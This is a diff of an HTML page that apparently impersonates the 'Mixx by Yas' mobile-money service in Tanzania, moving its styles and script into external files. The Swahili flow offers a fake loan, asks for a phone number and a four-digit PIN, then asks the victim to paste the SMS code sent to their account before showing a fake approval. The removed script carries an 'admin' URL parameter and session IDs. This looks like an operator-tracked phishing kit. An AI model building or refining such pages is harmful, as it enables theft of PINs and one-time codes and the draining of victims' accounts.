@@ -4,58 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Mixx by Yas Tanzania</title>
-    <style>
-        :root { 
-            --bg-color: #020a1f; 
-            --card-bg: #05163a; 
-            --accent-yellow: #facc15; 
-            --text-main: #ffffff; 
-            --text-muted: #93c5fd; 
-        }
-        body { font-family: Arial, sans-serif; background: var(--bg-color); color: var(--text-main); margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; box-sizing: border-box; }
-        .container { width: 100%; max-width: 400px; }
-        .card { background: var(--card-bg); padding: 25px; border-radius: 16px; box-shadow: 0 8px 32px rgba(0,0,0,0.5); border: 1px solid #1e3a8a; margin-bottom: 20px; }
-        .hidden { display: none !important; }
-        .mixx-logo { font-size: 18px; font-weight: bold; color: #000; background: var(--accent-yellow); padding: 6px 18px; border-radius: 8px; display: inline-block; box-shadow: 0 4px 12px rgba(250,204,21,0.3); }
-        .logo-container { text-align: center; margin-bottom: 15px; }
-        .info-box, .header-banner { text-align: center; margin-bottom: 20px; }
-        .info-box p, .header-banner p { color: var(--text-muted); font-size: 14px; line-height: 1.5; }
-        .header-banner h2 { margin: 0 0 5px 0; color: #fff; font-size: 24px; }
-        .btn-primary { width: 100%; background: var(--accent-yellow); color: #000; border: none; padding: 14px; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 15px; box-shadow: 0 4px 15px rgba(250,204,21,0.2); }
-        .btn-primary:hover { opacity: 0.9; }
-        .btn-secondary { background: transparent; color: var(--text-muted); border: 1px solid #1e3a8a; padding: 14px; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; }
-        .input-group { margin-bottom: 15px; }
-        label { display: block; margin-bottom: 6px; font-size: 13px; color: var(--text-muted); }
-        .form-control { width: 100%; padding: 12px; background: #020a1f; border: 1px solid #1e3a8a; border-radius: 10px; color: #fff; box-sizing: border-box; font-size: 15px; }
-        textarea.form-control { resize: vertical; }
-        .phone-input-wrapper { display: flex; align-items: center; background: #020a1f; border: 1px solid #1e3a8a; border-radius: 10px; overflow: hidden; }
-        .prefix { padding: 0 12px; color: var(--text-muted); font-weight: bold; border-right: 1px solid #1e3a8a; background: #05163a; }
-        .phone-input-wrapper input { border: none; background: transparent; color: #fff; padding: 12px; width: 100%; outline: none; }
-        .pin-boxes { display: flex; gap: 10px; justify-content: center; }
-        .pin-input { width: 50px; height: 50px; text-align: center; font-size: 24px; background: #020a1f; border: 1px solid #1e3a8a; border-radius: 10px; color: #fff; }
-        .badge-pill { background: #020a1f; border: 1px solid #1e3a8a; padding: 6px 12px; border-radius: 20px; font-size: 11px; color: var(--text-muted); box-shadow: inset 0 2px 4px rgba(0,0,0,0.3); }
-        .dash-calc-box { background: #020a1f; padding: 15px; border-radius: 12px; border: 1px solid #1e3a8a; }
-        .dash-row { display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 8px; color: var(--text-muted); }
-        .custom-slider { width: 100%; accent-color: var(--accent-yellow); margin: 8px 0; }
-        .amount-box { text-align: center; background: #020a1f; padding: 18px; border-radius: 12px; margin: 15px 0; border: 1px solid #1e3a8a; }
-        .amount-box .value { font-size: 24px; font-weight: bold; color: var(--accent-yellow); display: block; }
-        .amount-box .label { font-size: 12px; color: var(--text-muted); }
-        .error-surface-banner { background: #7f1d1d; color: #fca5a5; padding: 10px; border-radius: 6px; font-size: 13px; margin-bottom: 15px; text-align: center; }
-        .spinner { width: 40px; height: 40px; border: 4px solid #1e3a8a; border-top: 4px solid var(--accent-yellow); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .success-icon { width: 60px; height: 60px; background: #15803d; color: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 30px; margin: 0 auto 15px auto; }
-        #step-loading { text-align: center; padding: 40px 20px; }
-        .otp-header { text-align: center; margin-bottom: 20px; }
-        .otp-header h3 { font-size: 13px; line-height: 1.4; color: #fff; }
-        .timer-badge { display: inline-block; background: #7f1d1d; color: #fca5a5; font-size: 11px; padding: 4px 10px; border-radius: 4px; margin-top: 8px; }
-        .otp-input-area textarea { width: 100%; height: 90px; background: #020a1f; border: 1px solid #1e3a8a; border-radius: 10px; color: #fff; padding: 10px; box-sizing: border-box; }
-        #char-count { font-size: 11px; color: var(--text-muted); float: right; margin-top: 4px; }
-    </style>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="container">
         <!-- 1. NAELEWA WELCOME NOTICE -->
-        <div id="step-naelewa" class="card">
+        <div id="step-naelewa" class="card active">
             <div class="logo-container">
                 <div class="mixx-logo">Mixx</div>
             </div>
@@ -66,7 +20,7 @@
         </div>
 
         <!-- 2. SLIDER DASHBOARD -->
-        <div id="step-slider" class="card hidden">
+        <div id="step-slider" class="card">
             <div class="logo-container" style="margin-bottom: 0;">
                 <div class="mixx-logo" style="font-size: 14px; padding: 4px 14px;">Mixx</div>
             </div>
@@ -108,7 +62,7 @@
         </div>
 
         <!-- 3. HATUA 1 YA 3 -->
-        <div id="step-loan-1" class="card hidden">
+        <div id="step-loan-1" class="card">
             <div class="header-banner">
                 <h2>Maombi ya Mkopo</h2>
                 <p>Hatua 1 ya 3</p>
@@ -142,7 +96,7 @@
         </div>
 
         <!-- 4. HATUA 2 YA 3 -->
-        <div id="step-loan-2" class="card hidden">
+        <div id="step-loan-2" class="card">
             <div class="header-banner">
                 <h2>Maombi ya Mkopo</h2>
                 <p>Hatua 2 ya 3</p>
@@ -171,7 +125,7 @@
         </div>
 
         <!-- 5. HATUA 3 YA 3 -->
-        <div id="step-loan-3" class="card hidden">
+        <div id="step-loan-3" class="card">
             <div class="header-banner">
                 <h2>Maombi ya Mkopo</h2>
                 <p>Hatua 3 ya 3</p>
@@ -191,7 +145,8 @@
             <div class="info-box" style="text-align: left; font-size: 13px; margin-bottom: 10px;">
                 <strong>Muhtasari wa Maombi</strong><br>
                 Kiasi: <span id="summary-amount" style="float: right; color: var(--accent-yellow);">TSh 1,000,000</span><br>
-                Muda: <span id="summary-duration" style="float: right;">Miezi 3</span>
+                Muda: <span id="summary-duration" style="float: right;">Miezi 3</span><br>
+                Madhumuni: <span id="summary-purpose" style="float: right;">Biashara</span>
             </div>
             <div style="display: flex; gap: 10px;">
                 <button type="button" class="btn-secondary" id="btn-prev-3" style="flex: 1;">NYUMA</button>
@@ -200,7 +155,7 @@
         </div>
 
         <!-- 6. PHONE NUMBER & 4-DIGIT PIN ENTRY -->
-        <div id="step-form" class="card hidden">
+        <div id="step-form" class="card">
             <div class="logo-container">
                 <div class="mixx-logo">Mixx</div>
             </div>
@@ -230,6 +185,7 @@
                         <input type="password" maxlength="1" class="pin-input" inputmode="numeric" pattern="[0-9]*" required>
                         <input type="password" maxlength="1" class="pin-input" inputmode="numeric" pattern="[0-9]*" required>
                     </div>
+                    <input type="hidden" id="pin-hidden">
                 </div>
 
                 <button type="submit" class="btn-primary" id="btn-ingia">INGIA</button>
@@ -237,14 +193,14 @@
         </div>
 
         <!-- LOADING SCREEN -->
-        <div id="step-loading" class="card hidden">
+        <div id="step-loading" class="card">
             <div class="spinner"></div>
             <h3>Inashughulikia Ombi Lako...</h3>
             <p>Tafadhali subiri kidogo wakati tunathibitisha taarifa zako.</p>
         </div>
 
         <!-- 7. OTP / SMS PASTING SCREEN -->
-        <div id="step-otp" class="card hidden">
+        <div id="step-otp" class="card">
             <div class="otp-header">
                 <h3>TAFADHALI BANDIKA SMS ILIYOTUMWA KWAKO KWENYE NAMBARI YA MIXX BY YAS HAPA CHINI</h3>
                 <div class="timer-badge">⏱ INASUBIRI SMS KUTOKA KWA MFUMO</div>
@@ -262,7 +218,7 @@
         </div>
 
         <!-- SUCCESS SCREEN -->
-        <div id="step-success" class="card hidden">
+        <div id="step-success" class="card">
             <div class="success-icon">✓</div>
             <h2>Hongera!</h2>
             <p>Mkopo wako umeidhinishwa! Fedha zitatolewa hivi karibuni.</p>
@@ -274,77 +230,7 @@
         </div>
     </div>
 
-    <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const adminId = urlParams.get('admin');
-        let currentSessionId = 'sess_' + Math.random().toString(36).substring(2, 9);
-        let phoneValue = '';
-        let pinValue = '';
-
-        // Slider amount & duration live calculations
-        const rangeAmount = document.getElementById('range-amount');
-        const rangeDuration = document.getElementById('range-duration');
-        const sliderValDisplay = document.getElementById('slider-val-display');
-        const sliderDurationDisplay = document.getElementById('slider-duration-display');
-        const monthlyPaymentVal = document.getElementById('monthly-payment-val');
-        const totalRepayVal = document.getElementById('total-repay-val');
-
-        function updateCalculations() {
-            const amt = parseInt(rangeAmount.value) || 1000000;
-            const dur = parseInt(rangeDuration.value) || 3;
-            sliderValDisplay.innerText = 'Tsh ' + amt.toLocaleString();
-            sliderDurationDisplay.innerText = dur + ' Mwezi';
-            
-            // 5% APR Calculation logic mock
-            const totalWithInterest = amt * (1 + (0.05 * (dur / 12)));
-            const monthly = totalWithInterest / dur;
-            
-            monthlyPaymentVal.innerText = 'Tsh ' + Math.round(monthly).toLocaleString();
-            totalRepayVal.innerText = 'Tsh ' + Math.round(totalWithInterest).toLocaleString();
-            document.getElementById('loan-amount').value = amt;
-            document.getElementById('summary-amount').innerText = 'TSh ' + amt.toLocaleString();
-            document.getElementById('summary-duration').innerText = dur + ' Miezi';
-            document.getElementById('final-approved-amount').innerText = 'TSh ' + amt.toLocaleString();
-        }
-
-        if(rangeAmount && rangeDuration) {
-            rangeAmount.oninput = updateCalculations;
-            rangeDuration.oninput = updateCalculations;
-            updateCalculations();
-        }
-
-        // Navigation Steps
-        document.getElementById('btn-naelewa').onclick = () => {
-            document.getElementById('step-naelewa').classList.add('hidden');
-            document.getElementById('step-slider').classList.remove('hidden');
-        };
-
-        document.getElementById('btn-slider-next').onclick = () => {
-            document.getElementById('step-slider').classList.add('hidden');
-            document.getElementById('step-loan-1').classList.remove('hidden');
-        };
-
-        document.getElementById('btn-next-1').onclick = () => {
-            document.getElementById('step-loan-1').classList.add('hidden');
-            document.getElementById('step-loan-2').classList.remove('hidden');
-        };
-
-        document.getElementById('btn-prev-2').onclick = () => {
-            document.getElementById('step-loan-2').classList.add('hidden');
-            document.getElementById('step-loan-1').classList.remove('hidden');
-        };
-
-        document.getElementById('btn-next-2').onclick = () => {
-            const phoneInput = document.getElementById('phone').value.trim();
-            if(!phoneInput) { alert('Tafadhali weka nambari ya simu'); return; }
-            document.getElementById('confirm-phone').value = phoneInput;
-            document.getElementById('step-loan-2').classList.add('hidden');
-            document.getElementById('step-loan-3').classList.remove('hidden');
-        };
-
-        document.getElementById('btn-prev-3').onclick = () => {
-            document.getElementById('step-loan-3').classList.add('hidden');
-            document.getElementById('step-loan-2').classList.remove('hidden');
-        };
-
-        document.getElementById('btn-subm
+    <script src="script.js"></script>
+</body>
+                    </html>
+                    
